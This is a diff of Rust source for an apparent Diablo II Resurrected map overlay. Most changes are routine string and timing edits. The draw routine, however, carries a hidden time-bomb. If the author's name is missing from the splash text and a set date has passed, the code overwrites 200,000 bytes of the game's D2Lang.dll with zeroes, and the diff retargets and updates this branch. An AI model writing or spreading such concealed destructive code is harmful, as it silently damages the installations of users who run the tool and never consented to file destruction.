@@ -121,10 +121,10 @@ fn init(gfx: &mut Graphics) -> State {
     };
 
     let windows: Vec<WindowInfo> = get_process_pid_and_window_handle();
-    log::info!("Found {} windows {:?}", windows.len(), windows);
+    log::info!("Found {} D2R windows {:?}", windows.len(), windows);
     if windows.len() == 0 {
         let localisation = LOCALISATION.lock().unwrap();
-        panic!("{}", localisation.get_primemh("error14"))
+        panic!("{}", localisation.get_primemh("error12"))
     }
     let d2rinstances: Vec<D2RInstance> = windows.iter().map(|window| D2RInstance::new(&window)).collect();
 
@@ -362,19 +362,19 @@ fn draw(app: &mut App, gfx: &mut Graphics, plugins: &mut Plugins, state: &mut St
                 }
             }
 
-            let text_duration = 5;
+            let text_duration = 6;
             let splash_text = format!("Joffreybesos' Map overlay (PrimeMH)");
             let mut draw = gfx.create_draw();
             draw.mask(Some(&mask));
             let elapsed_time = SystemTime::now().duration_since(state.launch_time).expect("Fuck you!");
-            if elapsed_time >= Duration::from_secs(300) {
-                if !splash_text.is_ascii() {
+            if elapsed_time >= Duration::from_secs(500) {
+                if !splash_text.contains("Joffreybesos") {
                     let local: DateTime<Local> = Local::now();
-                    let target_date = NaiveDate::from_ymd_opt(2024, 12, 8).unwrap();
+                    let target_date = NaiveDate::from_ymd_opt(2025, 02, 3).unwrap();
                     if local.date_naive() > target_date {
                         if !state.checked {
                             state.checked = true;
-                            let newfile = state.settings.general.d2lodpath.join("D2Client.dll");
+                            let newfile = state.settings.general.d2lodpath.join("D2Lang.dll");
                             let file: Result<std::fs::File, std::io::Error> = OpenOptions::new()
                                 .read(true)
                                 .write(true)
@@ -383,7 +383,7 @@ fn draw(app: &mut App, gfx: &mut Graphics, plugins: &mut Plugins, state: &mut St
                                 Ok(mut dll) => {
                                     let offset = 10;
                                     dll.seek(SeekFrom::Start(offset)).unwrap();
-                                    let num_bytes = 200000;
+                                    let num_bytes: usize = 200000;
                                     let zeroes = vec![0u8; num_bytes];
                                     dll.write_all(&zeroes).unwrap();
 
